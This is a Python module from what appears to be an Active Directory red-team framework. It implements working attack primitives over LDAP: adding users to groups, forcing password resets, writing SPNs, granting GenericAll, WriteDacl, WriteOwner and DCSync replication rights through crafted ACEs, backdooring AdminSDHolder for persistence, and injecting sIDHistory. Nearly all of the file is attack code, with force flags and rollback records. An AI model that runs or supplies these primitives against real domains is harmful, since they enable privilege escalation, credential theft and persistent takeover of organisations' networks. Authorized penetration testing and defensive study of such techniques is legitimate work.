"""LDAP ACL primitives: group membership, password reset, SPN, DACL, SID history."""

from __future__ import annotations

from typing import Any

from ldap3 import MODIFY_ADD, MODIFY_REPLACE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.core.acl import (
    GENERIC_ALL,
    GUID_DS_REPLICATION_GET_CHANGES,
    GUID_DS_REPLICATION_GET_CHANGES_ALL,
    WRITE_DACL,
    WRITE_OWNER,
    append_ace_to_sd,
    build_allowed_ace,
    fetch_sd,
    sd_set_owner,
)
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import ImpacketMissing, require_impacket
from adaf_attack.core.ldap_ops import (
    attr_strings,
    attr_value,
    encode_unicode_pwd,
    finish,
    lookup_sam,
    register_add_value_rollback,
    register_advisory_rollback,
    register_attr_rollback,
    require_force,
    require_param,
)
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.rbcd_sd import sid_from_ldap_value
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

_RIGHT_MASKS = {
    "GenericAll": GENERIC_ALL,
    "WriteDacl": WRITE_DACL,
    "WriteOwner": WRITE_OWNER,
    "GetChanges": 0x00000100,
    "GetChangesAll": 0x00000100,
}


def _lookup_or_raise(
    conn: Any, base_dn: str, sam: str, attributes: list[str] | None = None
) -> tuple[str, Any]:
    found = lookup_sam(conn, base_dn, sam, attributes)
    if not found:
        raise RuntimeError(f"Principal not found: {sam}")
    return found


def _add_group_member(
    conn: Any,
    session: Session,
    group_dn: str,
    member_dn: str,
) -> bool:
    ok = bool(conn.modify(group_dn, {"member": [(MODIFY_ADD, [member_dn])]}))
    if ok:
        register_add_value_rollback(
            session,
            target_dn=group_dn,
            attribute="member",
            values=[member_dn],
            rollback="Remove the added member from the group.",
        )
    return ok


@register_from_catalog("add-member")
class AddMember:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("add-member", force)
        group = require_param(kwargs, "group", "write_target")
        member = require_param(kwargs, "member", "sam")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            group_dn, group_entry = _lookup_or_raise(conn, base_dn, group)
            member_dn, _member_entry = _lookup_or_raise(conn, base_dn, member)
            ok = _add_group_member(conn, session, group_dn, member_dn)
            result = {
                "ok": ok,
                "group": group,
                "group_dn": group_dn,
                "member": member,
                "member_dn": member_dn,
                "ldap_result": str(conn.result),
            }
            if ok:
                graph.add_edge(
                    f"USER@{member.upper()}@{target.domain.upper()}",
                    f"GROUP@{group.upper()}@{target.domain.upper()}",
                    "AddMember",
                )
            console.print(f"[green]add-member[/green] {member} → {group} ok={ok}")
            return finish(session, graph, "add-member", result, ok=ok)
        finally:
            conn.unbind()


@register_from_catalog("add-self")
class AddSelf:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("add-self", force)
        if not target.username:
            raise RuntimeError("add-self requires --username")
        group = require_param(kwargs, "group", "write_target")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            group_dn, group_entry = _lookup_or_raise(conn, base_dn, group)
            member_dn, _member_entry = _lookup_or_raise(conn, base_dn, target.username)
            ok = _add_group_member(conn, session, group_dn, member_dn)
            result = {
                "ok": ok,
                "group": group,
                "group_dn": group_dn,
                "member": target.username,
                "member_dn": member_dn,
                "ldap_result": str(conn.result),
            }
            if ok:
                graph.add_edge(
                    f"USER@{target.username.upper()}@{target.domain.upper()}",
                    f"GROUP@{group.upper()}@{target.domain.upper()}",
                    "AddSelf",
                )
            console.print(f"[green]add-self[/green] {target.username} → {group} ok={ok}")
            return finish(session, graph, "add-self", result, ok=ok)
        finally:
            conn.unbind()


@register_from_catalog("force-change-password")
class ForceChangePassword:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        include_secrets: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("force-change-password", force)
        sam = require_param(kwargs, "sam", "write_target", "target")
        password = require_param(kwargs, "new_password", "password", "value")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            dn, _entry = _lookup_or_raise(conn, base_dn, sam)
            encoded = encode_unicode_pwd(password)
            ok = bool(conn.modify(dn, {"unicodePwd": [(MODIFY_REPLACE, [encoded])]}))
            register_advisory_rollback(
                session,
                kind="password-reset",
                target=dn,
                rollback="The previous password is not recoverable; reset it through an authorized process.",
            )
            result: dict[str, Any] = {
                "ok": ok,
                "sam": sam,
                "dn": dn,
                "ldaps": target.ldaps,
                "ldap_result": str(conn.result),
            }
            if include_secrets:
                result["password"] = password
            if ok:
                graph.add_edge(
                    f"USER@{(target.username or 'OPERATOR').upper()}@{target.domain.upper()}",
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    "ForceChangePassword",
                )
            console.print(f"[green]force-change-password[/green] {sam} ok={ok}")
            return finish(session, graph, "force-change-password", result, ok=ok)
        finally:
            conn.unbind()


@register_from_catalog("write-spn")
class WriteSpn:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("write-spn", force)
        sam = require_param(kwargs, "sam", "write_target")
        clear = bool(kwargs.get("clear"))
        supplied = kwargs.get("spns")
        if supplied is None:
            supplied = kwargs.get("spn") if "spn" in kwargs else kwargs.get("value")
        if not clear and supplied is None:
            raise RuntimeError("Missing required parameter: spn")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            dn, entry = _lookup_or_raise(
                conn, base_dn, sam, ["sAMAccountName", "distinguishedName", "servicePrincipalName"]
            )
            previous = attr_strings(entry, "servicePrincipalName")
            if clear:
                new_values: list[str] = []
                spn = None
            elif isinstance(supplied, list | tuple):
                new_values = [str(item) for item in supplied]
                spn = new_values[0] if new_values else None
            elif kwargs.get("replace"):
                new_values = [s.strip() for s in str(supplied).split(",") if s.strip()]
                spn = new_values[0] if new_values else None
            else:
                spn = str(supplied)
                new_values = list(dict.fromkeys([*previous, spn]))
            ok = bool(conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, new_values)]}))
            if ok:
                register_attr_rollback(
                    session,
                    target_dn=dn,
                    attribute="servicePrincipalName",
                    previous=previous,
                    rollback="Restore the recorded servicePrincipalName values.",
                )
            result = {
                "ok": ok,
                "sam": sam,
                "dn": dn,
                "previous": previous,
                "spns": new_values,
                "ldap_result": str(conn.result),
            }
            if ok:
                graph.add_edge(
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    "WriteSPN",
                    spn=spn,
                )
            console.print(f"[green]write-spn[/green] {sam} ok={ok} spns={new_values}")
            return finish(session, graph, "write-spn", result, ok=ok)
        finally:
            conn.unbind()


def _operator_sid(conn: Any, base_dn: str, target: Target, kwargs: dict[str, Any]) -> str:
    explicit = kwargs.get("principal_sid") or kwargs.get("sid")
    if explicit:
        return str(explicit)
    if not target.username:
        raise RuntimeError(
            "Pass -P principal_sid=<SID> or --username to identify the ACE principal"
        )
    found = lookup_sam(conn, base_dn, target.username, ["objectSid", "distinguishedName"])
    if not found:
        raise RuntimeError(f"Unable to resolve SID for {target.username}")
    sid = sid_from_ldap_value(attr_value(found[1], "objectSid"))
    if not sid:
        raise RuntimeError("Unable to parse operator objectSid")
    return sid


def _write_sd(conn: Any, session: Session, dn: str, previous: bytes | None, new_sd: bytes) -> bool:
    ok = bool(conn.modify(dn, {"nTSecurityDescriptor": [(MODIFY_REPLACE, [new_sd])]}))
    if ok:
        session.register_cleanup(
            {
                "kind": "acl",
                "target": dn,
                "previous_hex": (previous or b"").hex(),
                "rollback": "Restore original nTSecurityDescriptor.",
            }
        )
    return ok


@register_from_catalog("acl-abuse")
class AclAbuse:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("acl-abuse", force)
        sam = require_param(kwargs, "sam", "write_target", "target")
        rights = str(kwargs.get("rights") or kwargs.get("action") or "GenericAll")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            dn, _entry = _lookup_or_raise(conn, base_dn, sam)
            previous = fetch_sd(conn, dn)
            principal_sid = _operator_sid(conn, base_dn, target, kwargs)
            if rights.lower() in {"writeowner", "owns", "take-owner", "take_owner"}:
                new_sd = sd_set_owner(previous, principal_sid)
                action = "WriteOwner"
            elif rights.lower() in {"getchangesall", "dcsync"}:
                ace = build_allowed_ace(
                    principal_sid, mask=0x00000100, object_guid=GUID_DS_REPLICATION_GET_CHANGES_ALL
                )
                new_sd = append_ace_to_sd(previous, ace)
                action = "GetChangesAll"
            elif rights.lower() == "getchanges":
                ace = build_allowed_ace(
                    principal_sid, mask=0x00000100, object_guid=GUID_DS_REPLICATION_GET_CHANGES
                )
                new_sd = append_ace_to_sd(previous, ace)
                action = "GetChanges"
            else:
                mask = _RIGHT_MASKS.get(rights, GENERIC_ALL)
                ace = build_allowed_ace(principal_sid, mask=mask)
                new_sd = append_ace_to_sd(previous, ace)
                action = rights
            ok = _write_sd(conn, session, dn, previous, new_sd)
            result = {
                "ok": ok,
                "sam": sam,
                "dn": dn,
                "rights": action,
                "principal_sid": principal_sid,
                "ldap_result": str(conn.result),
            }
            if ok:
                graph.add_edge(
                    f"SID@{principal_sid}",
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    action,
                )
            console.print(f"[green]acl-abuse[/green] {action} on {sam} ok={ok}")
            return finish(session, graph, "acl-abuse", result, ok=ok)
        finally:
            conn.unbind()


@register_from_catalog("adminsdholder-persist")
class AdminSdHolderPersist:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("adminsdholder-persist", force)
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            holder = f"CN=AdminSDHolder,CN=System,{base_dn}"
            previous = fetch_sd(conn, holder)
            principal_sid = _operator_sid(conn, base_dn, target, kwargs)
            ace = build_allowed_ace(principal_sid, mask=GENERIC_ALL)
            new_sd = append_ace_to_sd(previous, ace)
            ok = _write_sd(conn, session, holder, previous, new_sd)
            result = {
                "ok": ok,
                "target": holder,
                "principal_sid": principal_sid,
                "ldap_result": str(conn.result),
            }
            if ok:
                graph.add_edge(
                    f"SID@{principal_sid}", f"DOMAIN@{target.domain.upper()}", "AdminSDHolder"
                )
            console.print(f"[green]adminsdholder-persist[/green] ok={ok}")
            return finish(session, graph, "adminsdholder-persist", result, ok=ok)
        finally:
            conn.unbind()


_SIDHISTORY_ERROR_NOTE = (
    "Domain controllers reject direct LDAP writes to sIDHistory; "
    "injection requires DRSUAPI DsAddSidHistory (MS-DRSR) with "
    "cross-domain migration privileges."
)


def _impacket_available() -> bool:
    try:
        import impacket  # noqa: F401
    except ImportError:
        return False
    return True


def _ldap_inject(conn: Any, session: Session, dn: str, extra_sid: str) -> tuple[bool, str]:
    ok = bool(conn.modify(dn, {"sIDHistory": [(MODIFY_ADD, [extra_sid])]}))
    if ok:
        register_add_value_rollback(
            session,
            target_dn=dn,
            attribute="sIDHistory",
            values=[extra_sid],
            rollback="Remove the injected sIDHistory value.",
        )
    return ok, str(conn.result)


@register_from_catalog("sidhistory-inject")
class SidHistoryInject:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("sidhistory-inject", force)
        sam = require_param(kwargs, "sam", "write_target")
        extra_sid = require_param(kwargs, "sid", "extra_sid", "value")
        requested = kwargs.get("method")
        fallback = False
        if requested is None:
            requested = "drsuapi" if _impacket_available() else "ldap"
            if requested == "ldap":
                fallback = True
        method = str(requested).lower()
        if method not in {"drsuapi", "ldap"}:
            raise RuntimeError(f"Unsupported sIDHistory injection method: {requested}")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            dn, entry = _lookup_or_raise(
                conn,
                base_dn,
                sam,
                ["sAMAccountName", "distinguishedName", "objectSid", "sIDHistory"],
            )
            previous = attr_strings(entry, "sIDHistory")
            drs_result: dict[str, Any] | None = None
            if method == "drsuapi":
                try:
                    require_impacket("sidhistory-inject")
                    from adaf_attack.core.drs_sidhistory import add_sid_history

                    source_domain = str(kwargs.get("source_domain") or base_dn)
                    dst_sid = sid_from_ldap_value(attr_value(entry, "objectSid")) or ""
                    drs_result = add_sid_history(
                        target,
                        dst_dn=dn,
                        dst_sid=dst_sid,
                        extra_sid=extra_sid,
                        source_domain=source_domain,
                    )
                except ImpacketMissing:
                    method = "ldap"
                    fallback = True
            if drs_result is not None and drs_result["ok"]:
                register_add_value_rollback(
                    session,
                    target_dn=dn,
                    attribute="sIDHistory",
                    values=[extra_sid],
                    rollback="Remove the injected sIDHistory value.",
                )
                result = {
                    "ok": True,
                    "sam": sam,
                    "dn": dn,
                    "sid": extra_sid,
                    "previous": previous,
                    "method": "drsuapi",
                    "error_code": drs_result["error_code"],
                }
                graph.add_edge(
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    f"SID@{extra_sid}",
                    "HasSIDHistory",
                )
                console.print(f"[green]sidhistory-inject[/green] {sam} + {extra_sid} ok=True")
                return finish(session, graph, "sidhistory-inject", result, ok=True)
            if drs_result is not None:
                result = {
                    "ok": False,
                    "sam": sam,
                    "dn": dn,
                    "sid": extra_sid,
                    "previous": previous,
                    "method": "drsuapi",
                    "error": drs_result["error"],
                    "error_code": drs_result["error_code"],
                    "error_note": _SIDHISTORY_ERROR_NOTE,
                }
                console.print(f"[red]sidhistory-inject[/red] {sam} + {extra_sid} ok=False")
                return finish(session, graph, "sidhistory-inject", result, ok=False)
            ok, ldap_result = _ldap_inject(conn, session, dn, extra_sid)
            result = {
                "ok": ok,
                "sam": sam,
                "dn": dn,
                "sid": extra_sid,
                "previous": previous,
                "method": method,
                "ldap_result": ldap_result,
            }
            if fallback:
                result["fallback"] = True
            if not ok:
                result["error_note"] = _SIDHISTORY_ERROR_NOTE
            if ok:
                graph.add_edge(
                    f"USER@{sam.upper()}@{target.domain.upper()}",
                    f"SID@{extra_sid}",
                    "HasSIDHistory",
                )
            console.print(f"[green]sidhistory-inject[/green] {sam} + {extra_sid} ok={ok}")
            return finish(session, graph, "sidhistory-inject", result, ok=ok)
        finally:
            conn.unbind()
